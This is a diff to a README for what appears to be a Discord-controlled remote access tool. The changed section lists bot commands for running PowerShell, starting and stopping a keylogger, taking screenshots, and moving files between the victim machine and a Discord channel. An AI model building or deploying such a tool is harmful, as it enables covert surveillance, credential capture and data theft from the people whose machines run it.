@@ -43,13 +43,21 @@ Once the bot is running, you can interact with it using Discord commands.
 ## Commands
 
 /cmd <command>: Execute a PowerShell command.
+
 /url: Show the URL of the last uploaded file.
+
 /kstart: Start the keylogger.
+
 /kstop: Stop the keylogger and save the log.
+
 /ping: Check if the bot is up and measure latency.
+
 /upload <file_path>: Upload a file to the Discord channel.
+
 /download <file_path>: Download the last uploaded file to a specified path.
+
 /screenshot: Take a screenshot and upload it.
+
 /kill: Stop the bot and delete its channel.
 
 ## Contributing
